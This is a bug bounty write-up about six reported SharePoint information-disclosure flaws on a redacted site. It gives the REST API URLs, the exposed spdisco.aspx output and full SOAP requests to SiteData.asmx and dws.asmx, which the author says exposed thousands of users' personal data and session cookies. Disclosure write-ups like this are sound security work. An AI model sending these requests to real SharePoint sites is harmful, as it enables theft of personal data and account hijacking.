---
title: Hunting on Microsoft SharePoint | The art of manipulation
categories: [BugBounty]
tags: [BugBounty, Infosec, SharePoint]
image:
  path: /assets/img/Hunting_SharePoint/main.webp
---

### Before Diving

I'll discuss with you how I found all users' PII leaked via Microsoft SharePoint API.

Firstly, what Is Microsoft SharePoint?

Microsoft SharePoint Is a CMS (Content Management System) like Joomla and WordPress being used for easier website management.

### Report-1

While browsing the site and proxying the traffic through Burp I noticed an interesting endpoint `bim.redacted.com/_api/web/lists/GetByTitle('Images')/items` Actually It was my first time dealing with Microsoft SharePoint, and I tried to replace (Images) with some other words like {passwords, keys, Emails, Users} when I entered `Users` … Bang

![Report1](/assets/img/Hunting_SharePoint/main.webp)

`NOTE` While I'm writing this write-up the 6 reports have been resolved and they just switched to WordPress ;D.

`Report 1 (High Severity) -> Accepted -> Resolved`

### Report-2

After this submission, I decided to dig deeper and I noticed some SharePoint filtering operators like {`$select`, `$fiter`, `$expand`} and `p_ID` so let’s play with `$select` & `p_ID`

`URL: bim.redacted.com/_api/web/lists/GetByTitle('Users')/items?$skiptoken=Paged=TRUE&p_ID=<ID>&$select=*`

By manipulating the `p_ID` I was able to see all the user's PII `(5320 users)` + we can access some data about the system by manipulating these Parameters

```
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/FieldValuesForEdit
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/FieldValuesAsText
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/AttachmentFiles
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/Folder
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/RoleAssignments
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Fields
```

The URL: `/_api/Web/Lists(guid’f936a00b-7bea-4ef8–9105-a624755e3fc7')/ContentTypes` exposed some Information about the users 9 columns that contain {Phone numbers, Countries, City State, etc…}

`Report 2 (High Severity) -> Accepted -> Resolved`

### Report-3

After 1 month I discovered another website that used Microsoft SharePoint In the scope and I tried the same techniques and submitted another report.

`Report 3 (High Severity) -> Accepted -> Resolved`

### Report-4

After that, I could dig deeper more and more.

I used tools like Sparty `https://github.com/adityaks/sparty` and `https://github.com/MayankPandey01/Sparty-2.0` to audit SharePoint architecture but a lot of the endpoints returned `403` status code `Forbidden` but the `bim.redacted.com/_vti_bin/spdisco.aspx` was exposed publicly without authentication (That's itself considered an Information Disclosure Vulnerability with high severity but it depends on the triager's mood but in my case the severity was high)

```
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/10.0
X-Sharepointhealthscore: 0
X-Aspnet-Version: 4.0.30319
Sprequestguid: ccaf19a1-c012-006a-9f9e-4d16c9ce2b8f
Request-Id: ccaf19a1-c012-006a-9f9e-4d16c9ce2b8f
X-Frame-Options: SAMEORIGIN
Sprequestduration: 50
Spiislatency: 0
X-Powered-By: ASP.NET
Microsoftsharepointteamservices: 16.0.0.4822
X-Content-Type-Options: nosniff
X-Ms-Invokeapp: 1; RequireReadOnly
Date: Fri, 29 Mar 2024 06:05:10 GMT
Content-Length: 6412

<discovery xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.xmlsoap.org/disco/">
  <contractRef  ref="https://bim.redacted.com/_vti_bin/alerts.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/alerts.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/alerts.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/Authentication.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/Authentication.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/Authentication.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/copy.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/copy.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/copy.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/diagnostics.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/diagnostics.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/diagnostics.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/dspsts.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/dspsts.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/dspsts.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/dws.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/dws.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/dws.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/forms.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/forms.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/forms.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/imaging.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/imaging.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/imaging.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/lists.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/lists.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/lists.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/meetings.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/meetings.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/meetings.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/People.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/People.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/People.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/permissions.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/permissions.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/permissions.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/SiteData.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/SiteData.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/SiteData.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/sites.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/sites.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/sites.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/spsearch.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/spsearch.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/spsearch.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/UserGroup.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/UserGroup.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/UserGroup.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/versions.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/versions.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/versions.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/views.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/views.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/views.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/WebPartPages.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/WebPartPages.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/WebPartPages.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/webs.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/webs.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/webs.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
</discovery>
```
When I tried to access those endpoints I got a 403 status code but I didn’t give up so I created a new account with 0 privileges I got 200 status code on a lot of endpoints but {Authentication, dspsts, forms, People, etc…} still were forbidden but {SiteData, sites, lists} were enough to access a lot of juicy Info.

`URL: https://bim.redacted.com/_vti_bin/SiteData.asmx`

![SiteData](/assets/img/Hunting_SharePoint/SiteData.webp)

It exposes good functionalities, but I focused on GetList, and GetListItems to extract Information about the lists.

![GetListItems](/assets/img/Hunting_SharePoint/GetListItems.webp)

`<strQuery>`, `<strViewFields>` and `<uRowLimit>`are optional but `<strListName>` Is mandatory .. the request:

```
POST /_vti_bin/SiteData.asmx HTTP/2
Host: bim.redacted.com
Content-Type: text/xml; charset=utf-8
Content-Length: 463
Cookie: Healthy
Soapaction: "http://schemas.microsoft.com/sharepoint/soap/GetListItems"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetListItems xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <strListName>f936a00b-7bea-4ef8-9105-a624755e3fc7</strListName>
      <uRowLimit>6000</uRowLimit>
    </GetListItems>
  </soap:Body>
</soap:Envelope>
```

Unfortunately, I got 403 but then I inserted a valid cookie without any privileges and I got 200 OK with 3066 users PII.

`Report 4 (High Severity) -> Accepted -> Resolved`

### Report-5

Then I entered `bim.redacted.com/_vti_bin/dws.asmx` and that was the most interesting part cause I found all the user’s cookies In a decrypted form (2 of them are triager's cookies and a lot of other researchers ;D) .. request:

```
POST /_vti_bin/dws.asmx HTTP/2
Host: bim.redacted.com
Content-Type: text/xml; charset=utf-8
Content-Length: 384
Cookie: Healthy
Soapaction: "http://schemas.microsoft.com/sharepoint/soap/dws/GetDwsData"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetDwsData xmlns="http://schemas.microsoft.com/sharepoint/soap/dws/">
      <document></document>
    </GetDwsData>
  </soap:Body>
</soap:Envelope>
```

I just sent the request with an empty `<document></document>` element that was the key.

![Users](/assets/img/Hunting_SharePoint/Users.webp)

The response shows other properties like `IsSiteAdmin` and `IsDomainGroup` etc…


`Report 5 (High Severity cause It only affects the confidentiality) -> Accepted -> Resolved`

### Report-6

In the last submission, I reported the exposed URL: `bim.redacted.com/_vti_bin/spdisco.aspx` as an Information Disclosure.

`Report 6 (High Severity) -> Accepted -> Resolved`

![Reports](/assets/img/Hunting_SharePoint/Reports.webp)

Hope you learn something and thanks for reading ❤.
